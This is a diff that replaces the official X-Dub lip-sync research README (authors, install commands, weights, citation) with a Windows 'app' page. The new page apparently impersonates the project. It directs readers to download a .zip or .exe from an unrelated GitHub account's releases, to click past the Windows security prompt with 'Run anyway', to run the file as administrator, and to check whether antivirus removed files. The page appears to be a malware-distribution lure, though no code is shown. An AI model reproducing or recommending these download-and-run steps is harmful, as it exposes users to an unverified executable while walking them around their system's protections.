@@ -1,233 +1,215 @@
-<h1 align="center">From Inpainting to Editing: Unlocking Robust Mask-Free Visual Dubbing via Generative Bootstrapping</h1>
+# 🎬 X-Dub - Sync Video Faces With Audio
 
-<div align='center'>
-    <a href='https://scholar.google.com/citations?user=KMrFk2MAAAAJ&hl=en&oi=sra' target='_blank'><strong>Xu He</strong></a><sup>1,*</sup>&emsp;
-    <a href='' target='_blank'><strong>Haoxian Zhang</strong></a><sup>2,†</sup>&emsp;
-    <a href='' target='_blank'><strong>Hejia Chen</strong></a><sup>3</sup>&emsp;
-    <a href='' target='_blank'><strong>Changyuan Zheng</strong></a><sup>1</sup>&emsp;
-    <a href='' target='_blank'><strong>Liyang Chen</strong></a><sup>1</sup>&emsp;
-</div>
+[![Download X-Dub](https://img.shields.io/badge/Download-X--Dub%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Astproducti8122/X-Dub/releases)
 
-<div align='center'>
-    <a href='' target='_blank'><strong>Songlin Tang</strong></a><sup>2</sup>&emsp;
-    <a href='' target='_blank'><strong>Jiehui Huang</strong></a><sup>4</sup>&emsp;
-    <a href='' target='_blank'><strong>Xiaoqiang Liu</strong></a><sup>2</sup>&emsp;
-    <a href='' target='_blank'><strong>Pengfei Wan</strong></a><sup>2</sup>&emsp;
-    <a href='' target='_blank'><strong>Zhiyong Wu</strong></a><sup>1,5,&#9993;</sup>&emsp;
-</div>
+## 📥 Download X-Dub
 
-<div align='center'>
-    <sup>1</sup> Tsinghua University &emsp; <sup>2</sup> Kling Team, Kuaishou Technology &emsp; <sup>3</sup> Beihang University &emsp; <sup>4</sup> HKUST &emsp; <sup>5</sup> CUHK
-</div>
-<div align='center'>
-    <small><sup>*</sup> Work done at Kling Team, Kuaishou Technology</small>&emsp;
-    <small><sup>†</sup> Project leader</small>&emsp;
-    <small><sup>&#9993;</sup> Corresponding author</small>
-</div>
+Use this link to visit the release page and download X-Dub for Windows:
 
-<br>
+https://github.com/Astproducti8122/X-Dub/releases
 
-<div align="center">
-  <p>
-    <a href="https://arxiv.org/abs/2512.25066" target="_blank"><img src="https://img.shields.io/badge/ArXiv-2512.25066-red" alt="arXiv"></a>&nbsp;
-    <a href="https://hjrphoebus.github.io/X-Dub/" target="_blank"><img src="https://img.shields.io/badge/Project-Homepage-green" alt="project homepage"></a>&nbsp;
-    <a href="https://github.com/KlingAIResearch/X-Dub" target="_blank"><img src="https://img.shields.io/github/stars/KlingAIResearch/X-Dub?style=social" alt="GitHub stars"></a>
-  </p>
-  
-https://github.com/user-attachments/assets/5b2d3fab-0de8-4682-9b95-36c11dfae3f5
+On the release page, look for the newest Windows file. It may be a `.zip` or `.exe` file. Download that file to your computer.
 
-  <p> 🔥 For more results, visit our <a href="https://hjrphoebus.github.io/X-Dub/" target="_blank"><strong>homepage</strong></a>. 🔥 
-  </p>
-  <p>
-  🙏🏻 If you find our work helpful, please consider giving us a ⭐ star. </p>
-</div>
+## 🖥️ What X-Dub Does
 
+X-Dub helps you match a character in a video with new audio. You can use it to make a face in a clip line up with a different voice track. It is made for people who want a simple way to try video dubbing on Windows.
 
-## 🔥 Updates
-- **`2026/03/19`**: 🔥 We release the [inference code](#3--inference) and [pretrained weights](https://huggingface.co/KlingTeam/X-Dub) for the public Wan-based X-Dub release.
-- **`2025/12/31`**: 🔥 We release the paper and project homepage: [paper](https://arxiv.org/abs/2512.25066) | [homepage](https://hjrphoebus.github.io/X-Dub/).
+You can use X-Dub to:
 
+- Sync a character’s mouth and face with new audio
+- Test dubbing on local video files
+- Work with a simple Windows app instead of command lines
+- Try visual dubbing without editing each frame by hand
 
-## 📖 Introduction
+## ✅ Before You Start
 
-This repository contains the official PyTorch implementation of **X-Dub**, introduced in [*From Inpainting to Editing: Unlocking Robust Mask-Free Visual Dubbing via Generative Bootstrapping*](https://arxiv.org/abs/2512.25066) (formerly *From Inpainting to Editing: A Self-Bootstrapping Framework for Context-Rich Visual Dubbing*).
+Make sure your Windows PC has:
 
-Due to company policy, we cannot open-source the internal model used in the paper. This repository instead releases a public X-Dub (Wan-5B) version based on Wan2.2-TI2V-5B. Because of the different backbone, we do not use the LoRA tuning described in the paper; instead, we use multi-stage SFT in the public release to achieve a similar effect. In our experiments, X-Dub (Wan-5B) produces satisfying lip-synced results broadly aligned with the internal version X-Dub (internal-1B):
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- Enough free disk space for the app and your video files
+- A modern Intel or AMD processor
+- A working speaker or headphones for audio checks
 
-<details>
-<summary>More qualitative results of X-Dub (Wan-5B)</summary>
-    
-https://github.com/user-attachments/assets/b1105660-dc26-46f9-b34a-df6d8b08c05e
+For faster results, a dedicated GPU can help. If your computer does not have one, the app may still run, but it can take longer.
 
-https://github.com/user-attachments/assets/241330b5-3ec2-4c04-a414-0f570551a50a
+## 🚀 How to Download and Run
 
-https://github.com/user-attachments/assets/2b705f7f-9461-48db-833c-0dd63d079da3
+1. Open the release page:  
+   https://github.com/Astproducti8122/X-Dub/releases
 
-https://github.com/user-attachments/assets/c254e450-ce65-45df-a3a5-900387b081c1
+2. Find the latest release at the top of the page.
 
-</details>
+3. Download the Windows file from the Assets section.
 
+4. If the file is a `.zip`, right-click it and choose **Extract All**.
 
-We still observe some differences in the current public release.
-Compared with the internal version, X-Dub (Wan-5B) shows the following practical differences:
+5. Open the extracted folder.
 
-- Better generalization to non-human characters such as cartoons, animated roles, and animals.
-- Slightly weaker temporal stability, with occasional flickering.
-- Slightly weaker subject consistency, including possible identity drift or color drift.
-- Occasional severe noisy frames in a small portion of cases (~2%).
-- Roughly 2× slower inference without acceleration strategies.
+6. If you see an `.exe` file, double-click it to start the app.
 
-<details>
-<summary>Some failure cases of X-Dub (Wan-5B)</summary>
-    
-https://github.com/user-attachments/assets/f9c0a303-135a-4261-8000-ea263ea41dd5
+7. If Windows shows a security prompt, choose **More info** and then **Run anyway** if you trust the file from the release page.
 
-</details>
+## 🗂️ What You Should See
 
-🏃 We are still trying to find the best implementation strategy, and will actively improve this repository. Quantitative comparisons between the public release and the internal version will be reported in future updates. If you have suggestions, please open an issue for discussion.
+After opening X-Dub, you should see a simple app window with controls for loading files and starting the dubbing process.
 
+Typical steps inside the app:
 
+- Load your video file
+- Load your audio file
+- Choose the character or face area
+- Start the sync process
+- Save the finished video
 
+## 🎯 Basic Use
 
-## 🏁 Getting Started
+Use this flow for your first run:
 
-⚠️ Inference typically requires ~21 GB VRAM.
+1. Open X-Dub.
+2. Pick a video from your computer.
+3. Pick an audio file you want to use.
+4. Set the target face or character area.
+5. Start the process.
+6. Wait for the output file to finish.
+7. Open the saved result and check the timing.
 
-### 1. 🛠️ Clone the code and prepare the environment
+For best results, use clear video and clear audio. Short clips are easier to test first.
 
-```bash
-git clone https://github.com/KlingAIResearch/X-Dub.git
-cd X-Dub
+## 📁 Good File Types to Use
 
-conda create -n x-dub python=3.10 -y
-conda activate x-dub
-```
+X-Dub works best with common media files:
 
-Install Python dependencies:
+- Video: `.mp4`, `.mov`, `.mkv`
+- Audio: `.wav`, `.mp3`, `.m4a`
 
-```bash
-pip install -r requirements.txt
-```
+If a file does not load, try a standard `.mp4` video and a `.wav` audio file first.
 
-Install OpenMMLab dependencies:
+## 🛠️ Common Setup Tips
 
-```bash
-pip install chumpy==0.70 --no-build-isolation
-pip install mmengine==0.10.7
-pip install mmcv==2.1.0 --no-build-isolation
-pip install mmdet==3.2.0
-pip install mmpose==1.3.2
-```
+If the app does not open:
 
-Install this repository (adapted from [DiffSynth-Studio](https://github.com/modelscope/DiffSynth-Studio)):
+- Make sure the file finished downloading
+- Check that you extracted the `.zip` file first
+- Right-click the app and choose **Run as administrator**
+- Restart your PC and try again
 
-```bash
-pip install -e . --no-deps
-```
+If the video does not load:
 
+- Move the file to a simple folder like `Downloads` or `Desktop`
+- Rename the file to remove special characters
+- Use a shorter file path
 
-### 2. 📥 Download pretrained weights
+If the result looks off:
 
-Download the released bundle directly to `checkpoints/`:
+- Try a clip with one clear face
+- Use a video with steady lighting
+- Use audio with one speaker
+- Test with a short file before using a long one
 
-```bash
-pip install -U "huggingface_hub[cli]"
-hf download KlingTeam/X-Dub --local-dir ./checkpoints --repo-type model
-```
+## 🔊 Best Results
 
-Move the DWpose files into `dwpose_tools/models/`:
+To get cleaner sync output, use:
 
-```bash
-mkdir -p dwpose_tools/models
-cp -r ./checkpoints/dwpose_tools/models/. ./dwpose_tools/models/
-rm -rf ./checkpoints/dwpose_tools
-```
+- Front-facing video
+- Good light on the face
+- Clear speech
+- One person in the frame
+- Short test clips before full videos
 
-After download, the expected layout is:
+Avoid:
 
-```text
-checkpoints/
-├── X-Dub_model.safetensors
-├── Wan2.2_VAE.safetensors
-├── models_t5_umt5-xxl-enc-bf16.safetensors
-├── umt5-xxl/
-├── whisper/
-│   └── large-v2.pt
-└── wav2vec2-base-960h/
+- Very dark clips
+- Fast camera movement
+- Heavy background noise
+- Multiple faces at once
+- Blurry source video
 
-dwpose_tools/models/
-├── yolox_l_8xb8-300e_coco.py
-├── yolox_l_8x8_300e_coco_20211126_140236-d3bd2b23.pth
-├── rtmw-x_8xb320-270e_cocktail14-384x288.py
-└── rtmw-x_simcc-cocktail14_pt-ucoco_270e-384x288-f840f204_20231122.pth
-```
+## 🧩 Example Workflow
 
+Here is a simple first-time flow:
 
-### 3. 🚀 Inference
+1. Download X-Dub from the releases page
+2. Extract the file if needed
+3. Open the app
+4. Load a short video clip
+5. Load a clean voice track
+6. Start the sync process
+7. Review the output video
+8. Repeat with a longer clip once it works well
 
-```bash
-python infer_lip_sync_pipeline.py \
-  --video_path assets/examples/video.mp4 \
-  --audio_path assets/examples/audio.wav \
-  --ckpt_path checkpoints/X-Dub_model.safetensors \
-  --ref_cfg_scale 2.5 \
-  --audio_cfg_scale 10.0 \
-  --num_inference_steps 30 \
-  --output_dir ./results
-```
+## 📌 Files and Folders
 
+You may see these kinds of files after download:
 
-## 📢 Input Video Auto-Cropping
-The inference pipeline supports arbitrary-size input videos and performs online auto-cropping. The current version supports **single-person** videos only. The inference script will:
+- `X-Dub.exe` — the app
+- `assets` — support files used by the app
+- `output` — saved result files
+- `models` — files used for visual processing
+- `logs` — run records if something fails
 
-- crop the faicial region
-- run lip-sync generation on the cropped and resized video (512x512)
-- map the generated result back to the original complete video
+Do not move files around unless you need to. Keeping the app in one folder helps avoid errors.
 
-<details>
-  <summary>Current cropping limitations</summary>
+## 💡 Simple Troubleshooting
 
-  For ease of use, this repository uses DWPose to estimate facial ldmks for cropping. This differs from the more complex offline FLAME-mesh-based cropping pipeline used in the paper.
+If X-Dub is slow:
 
-  The current online strategy may introduce visible jitter and may fail to follow the face reliably when the head moves rapidly. The current release also does not support target tracking in multi-person scenes.
+- Close other apps
+- Use a shorter video
+- Lower the video size for testing
+- Check that your PC is not running low on memory
 
-</details>
+If X-Dub closes on startup:
 
-🏃 We plan to improve the cropping strategy and add better multi-person support in future updates.
+- Re-download the release file
+- Extract the archive again
+- Make sure your antivirus did not remove a file
+- Try running it from a local folder, not from inside the zip
 
+If the output sound and video do not match:
 
-## 💡 Practical Hints
-- `ref_cfg_scale` and `audio_cfg_scale` control the balance between reference appearance fidelity and audio-driven mouth motion. Different cases may prefer slightly different values.
-- We recommend setting `num_inference_steps` in the range of `25-50`. Higher values increase runtime and may improve quality, but this has not been exhaustively evaluated yet.
+- Check the audio file length
+- Make sure the source clip starts cleanly
+- Try a new audio file with steady speech
 
+## 🧪 First Test Plan
 
-## 📝 TODO
-- [ ] Report quantitative comparisons between the public version and the paper version.
-- [ ] Support multi-person video dubbing.
-- [ ] Improve the cropping pipeline.
-- [ ] Inference acceleration.
+Use this test plan if you want a quick check:
 
+- 10 to 20 second video
+- One person on screen
+- Clear face
+- One voice track
+- Simple background
+- Standard `.mp4` video file
 
-## ⚖️ Ethical Considerations
-This work can be misused for identity impersonation or deceptive synthetic media. We support clear labeling of AI-generated content and encourage further work on reliable detection methods. All models and materials in this repository are intended for academic research and technical demonstration only.
+This makes it easier to see if X-Dub is working before you use a longer project.
 
-If you have questions, please contact: `hexu18@mails.tsinghua.edu.cn`
+## 🔐 Safe Download Steps
 
+Use only the release page linked above:
 
-## 🙏 Acknowledgments
-We thank [**Wan2.2**](https://github.com/Wan-Video/Wan2.2) for the open-source model backbone, and [**DiffSynth-Studio**](https://github.com/modelscope/DiffSynth-Studio) for the training and inference framework.
+https://github.com/Astproducti8122/X-Dub/releases
 
+After download:
 
-## 🔖 Citation
+- Check that the file name matches the newest release
+- Keep the file in a folder you can find later
+- Open only the file from the extracted release folder
 
-```bibtex
-@misc{he2025inpaintingeditingselfbootstrappingframework,
-      title={From Inpainting to Editing: A Self-Bootstrapping Framework for Context-Rich Visual Dubbing}, 
-      author={Xu He and Haoxian Zhang and Hejia Chen and Changyuan Zheng and Liyang Chen and Songlin Tang and Jiehui Huang and Xiaoqiang Liu and Pengfei Wan and Zhiyong Wu},
-      year={2025},
-      eprint={2512.25066},
-      archivePrefix={arXiv},
-      primaryClass={cs.CV},
-      url={https://arxiv.org/abs/2512.25066}, 
-}
-```
+## 📎 Project Details
+
+Repository name: X-Dub
+
+Description: Try X-Dub to sync any character in a video with any audio you like | Official repository for From Inpainting to Editing: Unlocking Robust Mask-Free Visual Dubbing via Generative Bootstrapping
+
+Primary use case: Windows video dubbing and face-to-audio sync
+
+## 🧭 Start Here
+
+1. Go to the release page
+2. Download the Windows file
+3. Extract it if needed
+4. Open the app
+5. Load a video and audio file
+6. Run the sync process
